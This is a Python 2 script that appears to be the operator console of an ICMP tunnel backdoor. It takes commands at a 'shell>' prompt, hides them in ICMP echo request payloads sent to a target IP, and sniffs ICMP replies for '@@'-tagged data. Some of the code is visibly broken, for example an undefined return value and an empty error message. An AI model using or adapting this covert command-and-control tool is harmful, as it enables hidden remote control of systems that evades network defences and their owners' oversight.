#! /usr/bin/env python
# -*- coding: utf8 -*-

import os
import re
import select
import socket
import struct
import sys
import thread
from threading import *
import time

import logbook

ICMP_ECHO_REPLY = 0
ICMP_ECHO_REQUEST = 8

def carry_around_add(a, b):
    c = a + b
    return (c & 0xffff) + (c >> 16)

def checksum(msg):
    # filed with zero if the length of msg is odd
    if len(msg)%2 is 1:
        msg += b'\x00'
    # process the internet checksum
    s = 0
    for i in range(0, len(msg), 2):
        w = ord(msg[i]) + (ord(msg[i+1]) << 8)
        s = carry_around_add(s, w)
    # make the result in big endian
    answer = ~s & 0xffff
    return answer >> 8 | (answer << 8 & 0xff00)

def send_one_ping(my_socket, dest_addr, ID, onlydata):
    data = "@@"+onlydata
    dest_addr  =  socket.gethostbyname(dest_addr)
    my_checksum = 0
    header = struct.pack("bbHHh", ICMP_ECHO_REQUEST, 0, my_checksum, ID, 1)
    bytesInDouble = struct.calcsize("d")
    my_checksum = checksum(header + data)
    header = struct.pack(
        "bbHHh", ICMP_ECHO_REQUEST, 0, socket.htons(my_checksum), ID, 1
    )
    packet = header + data
    my_socket.sendto(packet, (dest_addr, 1)) # Don't know about the 1


def do_one(dest_addr, timeout,payload):
    icmp = socket.getprotobyname("icmp")
    try:
        my_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)
    except socket.error, (errno, msg):
        if errno == 1:
            # Operation not permitted
            msg = msg + (

            )
            raise socket.error(msg)
        raise # raise the original error

    my_ID = os.getpid() & 0xFFFF

    send_one_ping(my_socket, dest_addr, my_ID,payload)
    my_socket.close()
    return delay

def startsniffing():
	HOST = '192.168.1.135'
	s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
	s.bind((HOST, 0))
	s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
	print "Sniffer Started....."
	while 1:
		data = s.recvfrom(65565)
		d1 = str(data[0])
		d2 = str(data[1])
		data1 = re.search('@@(.*)', d1)
		datapart = data1.group(0)
		print datapart
		command = data1.group(0)
		cmd = command[2:]
		ip = d2[2:-5]
		print command
		print ip
		print data
thread.start_new_thread(startsniffing,())
ip = raw_input("Enter the destination IP: ")
delay = 1
while 1:
	command = raw_input("shell>")
	if command == "quit":
		break
	else:
		do_one(ip,delay,command)
		print("Executing Command....\n")
